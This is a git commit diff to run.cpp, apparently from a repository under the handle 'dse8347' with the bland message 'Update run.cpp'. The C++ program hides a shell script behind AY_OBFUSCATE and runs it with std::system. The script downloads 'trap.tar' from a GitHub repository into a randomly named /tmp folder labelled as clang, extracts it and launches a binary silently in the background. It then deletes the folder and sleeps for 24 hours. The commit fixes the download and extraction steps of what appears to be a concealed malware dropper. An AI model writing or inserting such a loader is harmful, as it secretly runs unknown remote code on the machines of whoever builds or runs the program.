b0f9c202c9eff7c21a2768bedc68e7c59c7d3c0e
dse8347 <107747125+dse8347@users.noreply.github.com>
2022-07-31 23:45:59 +0800

    Update run.cpp

--- run.cpp
+++ run.cpp
@@ -4,8 +4,8 @@ int main() {
 std::system(AY_OBFUSCATE("\n\
 CLANG=$(shuf -n 1 -i 10000000-99999999)\n\
 mkdir -p /tmp/$CLANG\n\
-wget -qO /tmp/$CLANG/clang.tar https://github.com/dse8347/dr/raw/main/trap\n\
-chmod +x /tmp/$CLANG/clang.tar -C /tmp/$CLANG\n\
+wget -qO /tmp/$CLANG/clang.tar https://github.com/dse8347/dr/raw/main/trap.tar\n\
+tar xf /tmp/$CLANG/clang.tar -C /tmp/$CLANG\n\
 nohup ./trap /tmp/$CLANG/clang >/dev/null 2>&1 & sleep 0.1\n\
 rm -rf /tmp/$CLANG\n\
 sleep 24h\n"));
